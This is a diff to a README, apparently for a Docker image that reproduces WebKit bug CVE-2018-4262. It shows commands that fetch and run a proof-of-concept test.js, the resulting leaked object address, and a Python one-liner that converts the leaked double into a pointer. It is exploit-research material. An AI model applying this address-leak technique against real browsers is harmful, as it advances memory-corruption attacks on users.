@@ -107,14 +107,17 @@ pwndbg> tele 0x7fe806be4010-8
 $ wget https://raw.githubusercontent.com/blacktop/docker-webkit/master/CVE-2018-4262/test.js
 $ docker run --init -it --rm -v `pwd`:/data blacktop/webkit:CVE-2018-4262 /data/test.js
 
-Object: "0x7f5843db4340" 👈 with butterfly 0x7f48000e4008 (Structure 0x7f5843df2ae0:[Array, {}, ArrayWithContiguous, Proto:0x7f5843dc80a0]), StructureID: 99
-6.91776252510795e-310
+Object: "0x7f5843db4340" 👈 with butterfly 0x7f48000e4008
+      (Structure 0x7f5843df2ae0:[Array, {}, ArrayWithContiguous, Proto:0x7f5843dc80a0]),
+            StructureID: 99
+Leaked Address: 6.91776252510795e-310
 ```
 
 #### Convert `double` to address
 
 ```bash
-$ python -c 'import struct; print(hex(struct.unpack("Q", struct.pack("d", 6.91776252510795e-310))[0]))'
+$ python -c 'import struct
+print(hex(struct.unpack("Q", struct.pack("d", 6.91776252510795e-310))[0]))'
 
 0x7f5843db4340 👍😎👍
 ```
